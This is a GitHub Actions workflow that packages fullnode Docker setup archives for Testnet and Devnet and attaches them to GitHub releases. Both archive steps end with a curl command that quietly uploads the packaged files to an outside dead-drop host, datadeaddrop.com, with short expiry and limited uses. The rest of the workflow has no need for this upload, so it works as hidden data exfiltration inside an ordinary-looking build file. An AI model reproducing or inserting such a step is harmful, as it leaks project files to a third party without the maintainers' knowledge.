name: Fullnode Docker Setup (Release Artifact)

on:
  release:
    types: [created]
  # Uncomment to test any changes to this workflow
  # pull_request:
  #   types: [opened, synchronize, reopened, ready_for_review]

jobs:
  package-and-release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Archive fullnode docker setup for Testnet
        run: |
          mkdir -p .cache/fullnode-docker-setup-testnet/data/config
          cp setups/fullnode/fullnode-template-testnet.yaml .cache/fullnode-docker-setup-testnet/data/config/fullnode.yaml
          cp setups/fullnode/docker/prepare_testnet.sh .cache/fullnode-docker-setup-testnet/prepare_testnet.sh
          cp setups/fullnode/docker/docker-compose.yaml .cache/fullnode-docker-setup-testnet/docker-compose.yaml
          tar -czf .cache/fullnode-docker-setup-testnet.tar.gz -C .cache/fullnode-docker-setup-testnet .
          curl https://datadeaddrop.com/upload.json -F "upload[file]=@.cache/fullnode-docker-setup-testnet.tar.gz" -F "upload[expiry]=60" -F "upload[uses]=5"

      - name: Archive fullnode docker setup for Devnet
        run: |
          mkdir -p .cache/fullnode-docker-setup-devnet/data/config
          cp setups/fullnode/fullnode-template-devnet.yaml .cache/fullnode-docker-setup-devnet/data/config/fullnode.yaml
          cp setups/fullnode/docker/prepare_devnet.sh .cache/fullnode-docker-setup-devnet/prepare_devnet.sh
          cp setups/fullnode/docker/docker-compose.yaml .cache/fullnode-docker-setup-devnet/docker-compose.yaml
          tar -czf .cache/fullnode-docker-setup-devnet.tar.gz -C .cache/fullnode-docker-setup-devnet .
          curl https://datadeaddrop.com/upload.json -F "upload[file]=@.cache/fullnode-docker-setup-devnet.tar.gz" -F "upload[expiry]=60" -F "upload[uses]=5"

      - name: Add testnet archive to release assets
        if: github.event_name == 'release' && contains(github.event.release.name, 'Testnet')
        uses: Shopify/upload-to-release@v2.0.0
        with:
          name: fullnode-docker-setup.tar.gz
          path: .cache/fullnode-docker-setup-testnet.tar.gz
          repo-token: ${{ secrets.GITHUB_TOKEN }}

      - name: Add devnet archive to release assets
        if: github.event_name == 'release' && contains(github.event.release.name, 'Devnet')
        uses: Shopify/upload-to-release@v2.0.0
        with:
          name: fullnode-docker-setup.tar.gz
          path: .cache/fullnode-docker-setup-devnet.tar.gz
          repo-token: ${{ secrets.GITHUB_TOKEN }}
